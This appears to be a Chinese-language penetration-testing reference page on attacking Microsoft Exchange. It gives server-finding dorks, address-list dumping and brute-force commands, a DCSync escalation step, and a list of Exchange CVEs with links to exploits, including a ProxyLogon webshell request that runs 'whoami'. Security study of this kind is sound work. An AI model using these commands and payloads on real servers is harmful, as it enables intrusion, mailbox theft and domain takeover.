# Exchange

<p align="center">
    <img src="../../../../../assets/img/banner/Exchange.png">
</p>

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**相关文章**
- [渗透测试中的Exchange](https://www.anquanke.com/post/id/226543)
- [渗透技巧——获得Exchange GlobalAddressList的方法](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Exchange-GlobalAddressList%E7%9A%84%E6%96%B9%E6%B3%95/)
- [Exchange漏洞攻略来啦！！](https://mp.weixin.qq.com/s/EIiYn4cr_PmPT8YgiDAfaQ)
- [Attacking MS Exchange Web Interfaces](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
- [细数微软Exchange的那些高危漏洞](https://mp.weixin.qq.com/s/O9SFufxz0rtAJtcP32giog)
- [深入Exchange Server在网络渗透下的利用方法](https://www.freebuf.com/articles/web/193132.html)
- [Exchange在渗透测试中的利用](https://evi1cg.me/archives/Exchange_Hack.html)
- [Exchange EWS接口的利用](https://www.t00ls.net/thread-62442-1-3.html)

**状况检查**
- [dpaulson45/HealthChecker](https://github.com/dpaulson45/HealthChecker) - Exchange Server 运行状况检查脚本
- [microsoft/CSS-Exchange](https://github.com/microsoft/CSS-Exchange) - Exchange Server支持工具和脚本,用于检测各类问题

---

# Dork

```
microsoft exchange 2013：
app="Microsoft-Exchange-2013"||app="Microsoft-Exchange-Server-2013-CU21"||app="Microsoft-Exchange-Server-2013-CU17"||app="Microsoft-Exchange-Server-2013-CU23"||app="Microsoft-Exchange-Server-2013-CU13"||app="Microsoft-Exchange-Server-2013-CU22"||app="Microsoft-Exchange-Server-2013-CU11"||app="Microsoft-Exchange-Server-2013-CU2"||app="Microsoft-Exchange-Server-2013-CU16"||app="Microsoft-Exchange-Server-2013-CU19"||app="Microsoft-Exchange-Server-2013-CU3"||app="Microsoft-Exchange-Server-2013-CU18"||app="Microsoft-Exchange-Server-2013-CU5"||app="Microsoft-Exchange-Server-2013-CU20"||app="Microsoft-Exchange-Server-2013-CU12"||app="Microsoft-Exchange-Server-2013-CU15"||app="Microsoft-Exchange-Server-2013-CU10"||app="Microsoft-Exchange-Server-2013-CU9"||app="Microsoft-Exchange-Server-2013-CU6"||app="Microsoft-Exchange-Server-2013-CU7"||app="Microsoft-Exchange-Server-2013-CU1"||app="Microsoft-Exchange-Server-2013-CU14"||app="Microsoft-Exchange-Server-2013-CU8"||app="Microsoft-Exchange-Server-2013-RTM"||app="Microsoft-Exchange-Server-2013-SP1"||app="Microsoft-Exchange-2013"

microsoft exchange 2016：
app="Microsoft-Exchange-Server-2016-CU19"||app="Microsoft-Exchange-Server-2016-CU3"||app="Microsoft-Exchange-Server-2016-CU12"||app="Microsoft-Exchange-Server-2016-RTM"||app="Microsoft-Exchange-Server-2016-CU7"||app="Microsoft-Exchange-Server-2016-CU17"||app="Microsoft-Exchange-Server-2016-CU2"||app="Microsoft-Exchange-Server-2016-CU1"||app="Microsoft-Exchange-Server-2016-CU14"||app="Microsoft-Exchange-Server-2016-CU5"||app="Microsoft-Exchange-Server-2016-CU11"||app="Microsoft-Exchange-Server-2016-CU9"||app="Microsoft-Exchange-Server-2016-CU16"||app="Microsoft-Exchange-Server-2016-CU10"||app="Microsoft-Exchange-Server-2016-CU6"||app="Microsoft-Exchange-Server-2016-CU13"||app="Microsoft-Exchange-Server-2016-CU18"||app="Microsoft-Exchange-Server-2016-CU8"||app="Microsoft-Exchange-Server-2016-CU4"||app="Microsoft-Exchange-2016-POP3-server"

microsoft exchange 2019：
app="Microsoft-Exchange-Server-2019-CU5"||app="Microsoft-Exchange-Server-2019-CU3"||app="Microsoft-Exchange-Server-2019-Preview"||app="Microsoft-Exchange-Server-2019-CU8"||app="Microsoft-Exchange-Server-2019-CU1"||app="Microsoft-Exchange-Server-2019-CU7"||app="Microsoft-Exchange-Server-2019-CU2"||app="Microsoft-Exchange-Server-2019-CU6"||app="Microsoft-Exchange-Server-2019-RTM"||app="Microsoft-Exchange-Server-2019-CU4"

microsoft exchange 2010：
app="Microsoft-Exchange-2010-POP3-server-version-03.1"||app="Microsoft-Exchange-Server-2010"
```

- [ysecurity/checkO365](https://github.com/vysecurity/checkO365) - 检查目标域是否正在使用 Office365 的工具

---

# 查看版本号

在登录界面查看网页源代码：

![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/9.png)

其中 15.1.2106.2 就是当前 exchange 的版本，在 Mircosoft 网站上根据版本号就可以直接查询：
- https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019

---

# 域内定位 Exchange 服务器

在域内可以使用 ldap 定位, 过滤规则
```
"(objectCategory=msExchExchangeServer)"
```

通过 spn 来定位
```
setspn -Q IMAP/*
nslookup.exe -type=srv _autodiscover._tcp
```

---

# 信息泄露

**IP**
- 访问以下接口,HTTP 协议版本修改成 1.0，去掉 http 头里面的 HOST 参数
    ```
    /Microsoft-Server-ActiveSync/default.eas
    /Microsoft-Server-ActiveSync
    /Autodiscover/Autodiscover.xml
    /Autodiscover
    /Exchange
    /Rpc
    /EWS/Exchange.asmx
    /EWS/Services.wsdl
    /EWS
    /ecp
    /OAB
    /OWA
    /aspnet_client
    /PowerShell
    ```

- msf
    ```bash
    use auxiliary/scanner/http/owa_iis_internal_ip  # 脚本里面限定了内网IP范围,如果企业是自定义的内网IP,可能无法获取到IP,https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/owa_iis_internal_ip.rb#L79
    ```

- nmap
    ```bash
    nmap x.x.x.x -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll
    ```

**导出邮箱列表 GlobalAddressList**
- 直接导出
    ```
    登录后,选择联系人->All Users。
    https://x.x.x.x/owa/#path=/people
    使用该目录获取通讯录列表, 可以通过 burp 修改返回邮件地址数量导出。一般不推荐
    ```

- Offline Address Book (OAB)

    访问 ：`https://<domain>/autodiscover/autodiscover.xml`

    ```
    POST /autodiscover/autodiscover.xml HTTP/1.1
    Host: test.f8x.com
    User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.10730; Pro)
    Authorization: Basic Q09OVE9TT1x1c2VyMDE6UEBzc3cwcmQ=
    Content-Length: 341
    Content-Type: text/xml

    <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
        <Request>
        <EMailAddress>test@f8x.com</EMailAddress>
        <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
        </Request>
    </Autodiscover>
    ```

    ![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/2.png)

    请求 `<OABUrl>/oab.xml` 页面并列出 OAB 文件：

    ![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/3.png)

    找到其中 Default Global Address List (默认全局地址列表) 对应的 lzx 文件名称，lzx 文件名称为 fd1e35ac-08ef-4e4c-a6fc-b8b88c69c7b2-data-1.lzx

    下载 lzx 文件
    ```
    win-4j4l8gp7bf2.f8x.com/OAB/b6eaa1c0-d7f5-4619-ad8d-b453f967353b/fd1e35ac-08ef-4e4c-a6fc-b8b88c69c7b2-data-1.lzx
    ```

    对 lzx 文件解码，还原出 Default Global Address List
    ```
    wget http://x2100.icecube.wisc.edu/downloads/python/python2.6.Linux-x86_64.gcc-4.4.4/bin/oabextract
    chmod +x oabextract
    ./oabextract fd1e35ac-08ef-4e4c-a6fc-b8b88c69c7b2-data-1.lzx gal.oab
    strings gal.oab|grep SMTP
    ```

- ldap

    ```
    ldapsearch -x -H ldap://$IP:389 -D "CN=$username,CN=Users,DC=f8x,DC=com" -w $password -b "DC=f8x,DC=com" |grep mail:
    ```

    Windows 系统通过 PowerView 获取所有用户邮件地址
    ```
    $uname=$username
    $pwd=ConvertTo-SecureString $password -AsPlainText -Force
    $cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)
    Get-NetUser -Domain f8x.com -DomainController $IP -ADSpath "LDAP://DC=f8x,DC=com" -Credential $cred | fl mail
    ```

- 域内查询

    域内查询可以使用传统的内网渗透方式导出域用户。也可以使用域管直接远程操作 Exchange 导出邮箱地址。

    ```
    $User = "f8x\administrator"
    $Pass = ConvertTo-SecureString -AsPlainText DomainAdmin123! -Force
    $Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass
    $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://Exchange01.f8x.com/PowerShell/ -Authentication Kerberos -Credential $Credential
    Import-PSSession $Session -AllowClobber
    Get-Mailbox|fl PrimarySmtpAddress
    Remove-PSSession $Session
    ```

- [sensepost/ruler](https://github.com/sensepost/ruler)
    ```
    ruler --insecure --url https://MAIL/autodiscover/autodiscover.xml --email test@test.com -u test -p 密码 --verbose --debug abk dump -o list.txt
    ```

- [dafthack/MailSniper](https://github.com/dafthack/MailSniper)
    ```
    Get-GlobalAddressList -ExchHostname MAIL -UserName CORP\test -Password 密码 -OutFile global-address-list.txt
    ```

- [impacket](https://github.com/SecureAuthCorp/impacket)
    ```
    python exchanger.py DOMAIN/test:密码@MAIL nspi list-tables

    python exchanger.py DOMAIN/test:密码@MAIL nspi dump-tables -guid xxxx
    ```

---

# 爆破

通常情况下,Exchange 系统是不对邮箱登录次数做限制,利用大字典来进行爆破,是最为常见的突破方法。

![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/1.png)

Exchange 邮箱的登录账号分为三种形式, 分别为 “domain\username”、“username” 和“user@domain（邮件地址）”, 这三种方式可以并存使用, 也可以限制具体一种或两种使用。

具体使用哪一种用户名登录可以根据登录口的提示确定, 但这并不百分百准确, 管理员通过修改配置或者登录页面, 可以自行设置登录方式, 和提示说明。因此如果直接使用 owa 页面爆破, 用户名需要尝试全部三种方式。

爆破方式使用 burp 即可, 通过返回包长短即可判断成功与否。

对于某些限制登录次数的网站, 还可以尝试对其 NTLM 验证接口进行爆破, 最常见的就是 ews 接口, 但除此之外，还有以下接口地址。
```
/Autodiscover/Autodiscover.xml  # 自 Exchange Server 2007 开始推出的一项自动服务,用于自动配置用户在Outlook中邮箱的相关设置,简化用户登录使用邮箱的流程。
/Microsoft-Server-ActiveSync/default.eas
/Microsoft-Server-ActiveSync    # 用于移动应用程序访问电子邮件
/Autodiscover
/Rpc/                           # 早期的 Outlook 还使用称为 Outlook Anywhere 的 RPC 交互
/EWS/Exchange.asmx
/EWS/Services.wsdl
/EWS/                           # Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互
/OAB/                           # 用于为Outlook客户端提供地址簿的副本,减轻 Exchange 的负担
/owa                            # Exchange owa 接口,用于通过web应用程序访问邮件、日历、任务和联系人等
/ecp                            # Exchange 管理中心,管理员用于管理组织中的Exchange 的Web控制台
/Mapi                           # Outlook连接 Exchange 的默认方式,在2013和2013之后开始使用,2010 sp2同样支持
/powershell                     # 用于服务器管理的 Exchange 管理控制台
```

可以利用以下工具进行爆破

- [APT34 Exchange 爆破工具](https://github.com/blackorbird/APT_REPORT/blob/master/APT34/Jason.zip)
- [grayddq/EBurst](https://github.com/grayddq/EBurst) - 这个脚本主要提供对 Exchange 邮件服务器的账户爆破功能，集成了现有主流接口的爆破方式。
- [sensepost/ruler](https://github.com/sensepost/ruler) - 爆破 Exchange

---

## ecp

exchange server 默认将其管理页面入口 Exchange Admin Center（ecp）和其正常邮箱登录口 Outlook Web Access（owa）一同发布。默认登录地址为 https://domain/ecp/

![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/5.png)

**权限**

![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/6.png)

域管 administrator 默认为邮箱管理员,但邮箱管理员和域管其实并无关系。添加邮箱管理员不会修改用户域内权限。

**搜索**

合规性管理 ——> 就地电子数据展示和保留 ——> 添加规则

![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/7.png)

**委托**

设置权限将邮箱委托给指定用户管理使用。

ecp ——> 收件人 ——> 目标用户 ——> 邮件委托 ——> 完全访问添加指定用户

![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/8.png)

---

# Post Exchange

## ACL

**相关文章**
- [域渗透——使用Exchange服务器中特定的ACL实现域提权](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83/)

所有的 Exchange Server 都在 Exchange Windows Permissions 组里面, 而这个组默认就对域有 WriteACL 权限, 那么当我们拿下 Exchange 服务器的时候, 就可以尝试使用 WriteACL 赋予自身 Dcsync 的权限.

使用 powerview，为当前 exchange 机器名用户增加 dcsync 权限, 然后抓取 hash
- https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
    ```
    Import-Module ActiveDirectory
    Import-Module .\PowerView.ps1
    import-module .\Microsoft.ActiveDirectory.Management.dll
    Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members test
    ```

    ![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/10.png)

    ![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/11.png)

    由于这个权限, Exchange 的 RCE 常用以在内网渗透中用来提升到域管权限.

---

## PTH

- [pentest-tools-public/Pass-to-hash-EWS](https://github.com/pentest-tools-public/Pass-to-hash-EWS)

---

## relay

- [Exchange 中继](../../OS安全/实验/NTLM中继.md#exchange中继)

---

# 漏洞

## CVE-2018-8581 任意用户伪造漏洞
- https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2018-8581

**简介**

Exchange 的 SSRF 默认携带凭据, 可以用于 Relay

1. 通过 HTTP 使用 NTLM 向攻击者进行交换身份验证
2. 与 NTLM 中继攻击相结合，使得用户可以低权限 (任意拥有邮箱的用户) 提权到域管理员。

**相关文章**
- [微软Exchange爆出0day漏洞，来看POC和技术细节](https://www.freebuf.com/vuls/195162.html)
- [Microsoft Exchange 任意用户伪造漏洞（CVE-2018-8581）分析](https://paper.seebug.org/804/)
- [MICROSOFT EXCHANGE漏洞分析 - CVE-2018-8581](https://0kee.360.cn/blog/microsoft-exchange-cve-2018-8581/)
- [分析CVE-2018-8581：在Microsoft Exchange上冒充用户](https://www.anquanke.com/post/id/168337)
- [船新版本的Exchange Server提权漏洞分析](https://www.anquanke.com/post/id/170199)
- [利用 Exchange SSRF 漏洞和 NTLM 中继沦陷域控](https://paper.seebug.org/833/)

**POC | Payload | exp**
- [Ridter/Exchange2domain](https://github.com/Ridter/Exchange2domain)
- [WyAtu/CVE-2018-8581](https://github.com/WyAtu/CVE-2018-8581)
- [dirkjanm/PrivExchange](https://github.com/dirkjanm/PrivExchange)

---

## CVE-2020-0688 远程代码执行漏洞

**简介**

当攻击者通过各种手段获得一个可以访问 Exchange Control Panel （ECP）组件的用户账号密码，就可以在被攻击的 exchange 上执行任意代码，直接获取服务器权限。

**影响版本**
- Exchange Server 2010 SP3
- Exchange Server 2013
- Exchange Server 2016 : cu16/cu17
- Exchange Server 2019 : cu5/cu6

**相关文章**
- [微软Exchange服务器远程代码执行漏洞复现分析[CVE-2020-0688]](https://xz.aliyun.com/t/7299)

**POC | Payload | exp**
- [Ridter/cve-2020-0688](https://github.com/Ridter/cve-2020-0688)
- [random-robbie/cve-2020-0688](https://github.com/random-robbie/cve-2020-0688)
- [zcgonvh/CVE-2020-0688](https://github.com/zcgonvh/CVE-2020-0688)

---

## CVE-2020-16875 远程代码执行漏洞

**简介**

由于对 cmdlet 参数的验证不正确，Microsoft Exchange 服务器中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在系统用户的上下文中运行任意代码。利用此漏洞需要拥有以某个 Exchange 角色进行身份验证的用户权限，由于 Exchange 服务以 System 权限运行，触发该漏洞亦可获得系统最高权限。

**影响版本**
- Exchange Server 2016 : cu16/cu17
- Exchange Server 2019 : cu5/cu6

**MSF 模块**
```
use exploit/windows/http/exchange_ecp_dlp_policy
```

**相关文章**
- [CVE-2020-16875：Microsoft Exchange RCE复现](https://cloud.tencent.com/developer/article/1704777)

**POC | Payload | exp**
- https://srcincite.io/pocs/cve-2020-16875.py.txt

---

## CVE-2020-17083 Microsoft Exchange Server任意代码执行漏洞

**相关文章**
- [CVE-2020-17083 Microsoft Exchange Server任意代码执行漏洞 POC](https://mp.weixin.qq.com/s/LMUMmuGfT3nmKN88O5hBAA)

**POC | Payload | exp**
- https://srcincite.io/pocs/cve-2020-17083.ps1.txt

---

## CVE-2020-17143 Microsoft Exchange 信息泄露漏洞

**POC | Payload | exp**
- https://srcincite.io/pocs/cve-2020-17143.py.txt

---

## CVE-2020-17144 登录后反序列化漏洞

- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-17144

**影响版本**
- Exchange2010

**相关文章**
- [从 CVE-2020-17144 看实战环境的漏洞武器化](https://mp.weixin.qq.com/s/nVtE-OFoO076x6T0147AMw)

**POC | Payload | exp**
- [Airboi/CVE-2020-17144-EXP](https://github.com/Airboi/CVE-2020-17144-EXP)
- [zcgonvh/CVE-2020-17144](https://github.com/zcgonvh/CVE-2020-17144)

---

## Proxylogon && CVE-2021-26855 && 27065

- https://proxylogon.com/
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855

**相关文章**
- [Reproducing the Microsoft Exchange Proxylogon Exploit Chain](https://www.praetorian.com/blog/reproducing-proxylogon-exploit/)
- [Microsoft Exchange Server CVE-2021-26855 漏洞利用](https://www.anquanke.com/post/id/234607)
- [CVE-2021-26855 Exchange Server RCE 复现](https://www.o2oxy.cn/3169.html)
- [CVE-2021-26855：Exchange SSRF致RCE复现](https://mp.weixin.qq.com/s/PDU5jeBST1IzffaWUQ3TQQ)
- [Microsoft Exchange 漏洞（CVE-2021-26855）在野扫描分析报告](https://mp.weixin.qq.com/s/C5GPtaCp-zNbSAWXf5gVpw)

**POC | Payload | exp**
- [hausec/ProxyLogon](https://github.com/hausec/ProxyLogon)
- [dwisiswant0/proxylogscan](https://github.com/dwisiswant0/proxylogscan)
- [sirpedrotavares/Proxylogon-exploit](https://github.com/sirpedrotavares/Proxylogon-exploit)
- [charlottelatest/CVE-2021-26855](https://github.com/charlottelatest/CVE-2021-26855) - 用户枚举
- [exp.py](https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/master/Exchange/CVE-2021-26855%20Exchange%20RCE/exp.py)
    ```
    POST /owa/auth/test11.aspx HTTP/1.1
    Host: 192.168.141.136
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/88.0.4324.190 Safari/537.36
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: close
    Cookie: X-BEResource=WIN-4J4L8GP7BF2/EWS/Exchange.asmx?a=~1942062522;
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 90

    code=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").StdOut.ReadAll());
    ```
- [microsoft/CSS-Exchange/blob/main/Security/README.md](https://github.com/microsoft/CSS-Exchange/blob/main/Security/README.md)
    ```
    nmap -p <port> --script http-vuln-cve2021-26855 <target>
    ```
- [CVE-2021-26855 Exchange RCE](https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/tree/master/Exchange/CVE-2021-26855%20Exchange%20RCE)
- [p0wershe11/ProxyLogon](https://github.com/p0wershe11/ProxyLogon) - ProxyLogon(CVE-2021-26855+CVE-2021-27065) Exchange Server RCE(SSRF->GetWebShell)
- [Flangvik/SharpProxyLogon](https://github.com/Flangvik/SharpProxyLogon)
- [Jumbo-WJB/Exchange_SSRF](https://github.com/Jumbo-WJB/Exchange_SSRF)

---

## Proxyshell

**相关文章**
- [Exchange SSRF漏洞从proxylogon到proxyshell(一)](https://mp.weixin.qq.com/s/B_5WWNjG110PCS_gHcpR-A)
- [Exchange proxyshell exp编写(二）](https://mp.weixin.qq.com/s/aEnoBvibp-gkt3qtcOXqAw)
- [Exchange-Proxyshell](https://mp.weixin.qq.com/s/GWFsIRlyR7i8nbg6b7kDnA)

**POC | Payload | exp**
- [GossiTheDog/scanning](https://github.com/GossiTheDog/scanning)
- [dmaasland/proxyshell-poc](https://github.com/dmaasland/proxyshell-poc)
- [Ridter/proxyshell_payload](https://github.com/Ridter/proxyshell_payload)
- [ktecv2000/ProxyShell](https://github.com/ktecv2000/ProxyShell)
- [wudicainiao/proxyshell-for-exchange_workload](https://github.com/wudicainiao/proxyshell-for-exchange_workload)

---

## ProxyToken

**相关文章**
- [PROXYTOKEN: AN AUTHENTICATION BYPASS IN MICROSOFT EXCHANGE SERVER](https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server)

---

## ProxyOracle && CVE-2021-31195 && CVE-2021-31196

**影响版本**

CVE-2021-31195
* Exchange Server 2013 < May21SU
* Exchange Server 2016 < May21SU < CU21
* Exchange Server 2019 < May21SU < CU10

CVE-2021-31196
* Exchange Server 2013 < Jul21SU
* Exchange Server 2016 < Jul21SU
* Exchange Server 2019 < Jul21SU

**相关文章**
- [ProxyOracle漏洞分析](https://mp.weixin.qq.com/s/wn6qgN6Yb-KslyHzLJ-bjA)
- [ProxyOracle漏洞分析](https://hosch3n.github.io/2021/08/23/ProxyOracle%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

**POC | Payload | exp**
- [hosch3n/ProxyVulns](https://github.com/hosch3n/ProxyVulns) - [ProxyLogon] CVE-2021-26855 & CVE-2021-27065 Fixed RawIdentity Bug Exploit. [ProxyOracle] CVE-2021-31195 & CVE-2021-31196 Exploit Chains. [ProxyShell] CVE-2021-34473 & CVE-2021-34523 & CVE-2021-31207 Exploit Chains.

---

## CVE-2021-41349 Exchange XSS 漏洞

**相关文章**
- [微软补丁日Poc｜Exchange XSS 漏洞（CVE-2021-41349）【含Python Poc】](https://mp.weixin.qq.com/s/WX95lcy7_PZvSIG0SALtFA)

**影响版本**
* <= Exchange 2013 update 23
* <= Exchange 2016 update 22
* <= Exchange 2019 update 11

---

## CVE-2021-42321

**相关文章**
- [CVE-2021-42321-天府杯Exchange 反序列化漏洞分析](https://mp.weixin.qq.com/s/qLOIyMlodeq8uOLEAJIzEA)

**POC | Payload | exp**
- [testanull/CVE-2021-42321_poc.py](https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398)
- [DarkSprings/CVE-2021-42321](https://github.com/DarkSprings/CVE-2021-42321)
